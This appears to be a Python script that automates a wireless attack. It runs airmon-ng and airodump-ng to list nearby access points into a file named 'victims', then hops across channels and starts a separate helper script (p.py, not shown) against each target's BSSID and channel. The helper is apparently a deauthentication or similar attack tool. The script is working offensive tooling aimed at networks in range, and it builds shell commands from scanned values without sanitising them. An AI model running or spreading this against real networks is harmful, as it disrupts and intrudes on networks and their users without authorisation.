import subprocess
import time
import csv
import os

j=0
l=0
u=1
bssid=[]
channel=[]
bssi=[]
def color(code):
    return "\33[{code}m".format(code=code)
#subprocess.run(["sudo","airmon-ng","start",i])
i=input("enter: ")
try:
    subprocess.run(["sudo","airmon-ng","check","kill"])
    subprocess.run(["sudo","airodump-ng","-w","victims","--output-format","csv","wlp0s20f3mon"])
    time.sleep(2)
    for file in os.listdir():
        if ".csv" in file:
            with open(file,"r") as f:
                reader=csv.reader(f)
                for row in reader:
                    for i in range(len(row)):
                        if (i==13):
                            if(j==0):
                                j=j+1
                                continue
                            bssid.append(row[0])
                            channel.append(row[3])
                            print(color(32)+f"[{j}]-------->{color(34)+row[i]}{color(32)}[{row[0]}][{row[3]}]")
                            j=j+1
                        else:
                            continue
            f.close()
            os.remove(file)
except KeyboardInterrupt:
    print(color(37),"keyboard")
    pass
j=1
kl=1
print(len(bssid))
while True:
    subprocess.run(["sudo","timeout","1s","airodump-ng","-c",str(j),"wlp0s20f3mon"])
    #subprocess.run(["sudo","timeout","1s","airodump-ng","-c",str(j),"wlx76012d40213b"])
    for i in range(0,len(bssid)):
        if(int(channel[i])==j):
            if(kl%1==0):
                os.system("gnome-terminal --title=k -x python3 p.py -f "+bssid[i]+" -l "+channel[i])
            '''if(kl%2!=0):
                os.system("gnome-terminal --title=k -x python3 i.py -f "+bssid[i]+" -l "+channel[i])
            kl=kl+1'''
            u=0
        if(j==16):
            j=1
    j=j+1
    print("o")
    if(u==0):
        time.sleep(15)
        u=1
